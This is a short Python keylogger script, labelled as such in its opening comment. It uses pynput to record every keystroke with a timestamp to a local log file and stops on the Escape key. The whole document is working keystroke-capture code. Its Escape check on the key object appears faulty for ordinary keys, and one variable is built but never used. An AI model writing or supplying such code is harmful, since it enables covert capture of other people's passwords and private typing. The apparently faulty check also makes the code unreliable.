#This is a normal Keylogger with the Python
from pynput.keyboard import Listener, Key
import logging

# Set up logging configuration
logging.basicConfig(filename=('log.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to be called when a key is pressed
def on_press(key):
    # Create a log message indicating which key was pressed
    k = '{0} was pressed at '.format(key)
    logging.info(str(key))

# Function to be called when a key is released
def on_release(key):
    # Check if the pressed key is the Escape key (key.esc), then listener have to stop
    if key == key.esc:
        return False

# Start the listener for key presses and releases
with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()

